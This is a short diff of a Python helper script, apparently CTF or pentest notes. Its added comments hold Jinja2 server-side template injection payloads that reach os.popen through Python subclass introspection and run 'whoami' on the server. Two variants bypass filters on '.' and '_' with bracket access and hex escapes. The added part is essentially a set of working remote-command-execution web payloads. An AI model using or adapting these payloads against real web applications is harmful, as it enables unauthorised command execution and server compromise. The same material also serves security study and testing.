@@ -14,3 +14,11 @@ for b in a:
             print (count)
             print (b)
             print ("")
+
+# payload: {{"".__class__.__base__.__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
+
+# 过滤.   例如："".__class__  -->  ""["__class__"]
+#{{""["__class__"]["__base__"]["__subclasses__"]()[300]["__init__"]["__globals__"]["os"]["popen"]("whoami")["read"]()}}
+
+# 过滤 _ 和 .
+#{{[]["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[300]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
